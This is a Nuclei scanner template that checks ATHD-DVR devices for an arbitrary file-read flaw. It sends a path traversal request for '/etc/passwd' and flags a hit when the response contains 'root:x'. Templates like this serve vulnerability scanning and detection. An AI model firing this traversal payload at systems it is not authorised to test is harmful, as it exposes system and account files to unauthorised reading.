# yaml-language-server: $schema=https://raw.githubusercontent.com/projectdiscovery/nuclei/dev/pkg/templates/nuclei-jsonschema.json
id: ATHD-DVR-fileRead

info:
  name: ATHD-DVR fileRead
  author: Str1am
  severity: medium
  tags: 53kf,file_read

http:
  - method: GET
    path:
      - "{{BaseURL}}/../../../etc/passwd"
    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
      - type: word
        words:
          - "root:x"
        part: body
        condition: and
